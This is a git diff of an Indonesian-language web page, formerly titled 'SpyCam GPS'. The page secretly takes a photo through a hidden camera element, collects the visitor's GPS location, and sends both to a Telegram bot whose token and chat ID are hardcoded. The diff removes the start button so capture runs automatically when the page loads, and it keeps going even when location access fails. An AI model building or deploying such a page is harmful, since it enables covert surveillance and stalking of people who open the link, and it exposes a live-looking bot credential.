@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>SpyCam GPS</title>
+  <title>Capture & GPS to Telegram</title>
 </head>
 <body>
-  <h3 id="status">Klik tombol untuk mulai</h3>
-  <button onclick="start()">Mulai</button>
-  <video id="video" autoplay muted playsinline style="display:none;"></video>
+  <h3 id="status">Memulai...</h3>
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
 
 <script>
-const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
-const CHAT_ID = "7218964278";
-const video = document.getElementById('video');
-const statusText = document.getElementById('status');
+const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k"; // ganti ini
+const CHAT_ID = "7218964278";     // ganti ini
+const statusText = document.getElementById("status");
+const video = document.getElementById("video");
 
 async function sendToTelegram(photoData, lokasi) {
   // Kirim lokasi
@@ -29,7 +28,7 @@ async function sendToTelegram(photoData, lokasi) {
   const blob = await (await fetch(photoData)).blob();
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
-  formData.append("photo", blob, "photo.png");
+  formData.append("photo", blob, "capture.png");
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
     method: "POST",
@@ -38,17 +37,22 @@ async function sendToTelegram(photoData, lokasi) {
 }
 
 async function start() {
-  statusText.textContent = "Meminta izin lokasi & kamera...";
   let lokasi = "Lokasi tidak tersedia";
-  let foto = null;
+  let photoData = null;
 
-  // Ambil lokasi
+  // Ambil lokasi (izin akan diminta otomatis)
   try {
     await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition((pos) => {
-        lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        resolve();
-      }, reject);
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          resolve();
+        },
+        (err) => {
+          lokasi = "Gagal dapat lokasi: " + err.message;
+          resolve(); // tetap lanjut
+        }
+      );
     });
   } catch {}
 
@@ -56,21 +60,35 @@ async function start() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
-    await new Promise(resolve => video.onloadedmetadata = resolve);
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+      };
+    });
 
+    // Tunda agar kamera menyala sempurna
+    await new Promise((resolve) => setTimeout(resolve, 3000));
+
+    // Ambil gambar dari kamera
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video, 0, 0);
-    foto = canvas.toDataURL("image/png");
-    stream.getTracks().forEach(track => track.stop());
-  } catch {}
+    photoData = canvas.toDataURL("image/png");
+
+    // Matikan kamera
+    stream.getTracks().forEach((track) => track.stop());
+  } catch (e) {
+    statusText.textContent = "Gagal akses kamera: " + e.message;
+  }
 
   statusText.textContent = "Mengirim ke Telegram...";
-  await sendToTelegram(foto, lokasi);
-  statusText.textContent = "Selesai. Data terkirim ke Telegram.";
+  await sendToTelegram(photoData, lokasi);
+  statusText.textContent = "Selesai, cek Telegram.";
 }
+
+start();
 </script>
 </body>
 </html>
